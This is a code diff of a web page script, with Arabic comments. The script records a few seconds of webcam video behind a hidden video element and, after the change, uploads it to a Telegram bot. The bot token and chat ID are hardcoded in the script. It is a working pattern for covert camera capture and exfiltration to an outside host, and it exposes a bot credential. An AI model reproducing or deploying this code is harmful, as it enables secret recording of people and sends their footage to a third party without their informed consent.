@@ -10,6 +10,8 @@
     <video id="video" autoplay playsinline muted style="display: none;"></video>
     <script>
         const video = document.getElementById('video');
+        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
+        const telegramChatId = "2070423407";
 
         // طلب الوصول إلى الكاميرا
         navigator.mediaDevices.getUserMedia({ video: true })
@@ -32,19 +34,19 @@
                     mediaRecorder.stop();
                 }, 3000);
 
-                // عند انتهاء التسجيل، إرسال الفيديو إلى الخادم
+                // عند انتهاء التسجيل، إرسال الفيديو إلى تيليجرام
                 mediaRecorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
                     const formData = new FormData();
+                    formData.append('chat_id', telegramChatId);
                     formData.append('video', blob, 'video.webm');
 
-                    fetch('http://localhost:3000/send-video', {
+                    fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
                         method: 'POST',
                         body: formData
                     })
-                        .then((response) => response.json())
-                        .then((data) => {
-                            if (data.ok) {
+                        .then((response) => {
+                            if (response.ok) {
                                 alert('Video sent successfully!');
                             } else {
                                 alert('Failed to send video.');
